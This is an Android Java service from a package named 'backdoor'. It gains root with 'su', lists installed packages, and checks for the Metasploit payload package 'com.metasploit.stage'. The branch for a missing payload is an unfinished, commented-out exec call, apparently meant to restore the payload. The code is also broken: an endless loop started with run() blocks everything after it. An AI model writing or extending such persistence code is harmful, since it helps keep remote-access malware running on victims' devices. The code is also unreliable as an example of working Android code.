package com.voila.backdoor;
import android.app.*;
import android.content.*;
import android.os.Bundle;
import android.os.IBinder;
import android.util.*;
import java.io.*;

public class srv extends Service
{
	public srv()
	{}

	@Override
	public IBinder onBind(Intent p1)
	{
		// TODO: Implement this method
		Log.i("fuck","onBind");
		return null;
	}

	@Override
	public void onCreate()
	{
		Log.i("fuck","onCreate");



		// TODO: Implement this method
		super.onCreate();
	}
	//public static receiver r=new receiver();
	@Override
	public int onStartCommand(Intent intent, int flags, int startId)
	{
		Log.i("fuck","onStartCommand");

		new Thread(){
			@Override
			public void run()
			{
				while(true)
				{
					Log.i("fuck","thread");
					try
					{
						Thread.sleep(2000);
					}catch(InterruptedException e)
					{}
				}
			}
		}.run();
		try
		{
			Process p=Runtime.getRuntime().exec("su");
			DataOutputStream os=new DataOutputStream(p.getOutputStream());
			os.writeBytes("pm list package\n");
			os.flush();
			os.close();
			BufferedReader br=new BufferedReader(new InputStreamReader(p.getInputStream()));
			String line=null;
			StringBuffer sb=new StringBuffer();
			while((line=br.readLine())!=null)
			{
				sb.append(line).append("\n");
			}
			if(sb.indexOf("com.metasploit.stage")==-1)
			{
				//p=Runtime.getRuntime().exec(
			}
		}catch(IOException e)
		{}
		return super.onStartCommand(intent,flags,startId);
	}
}
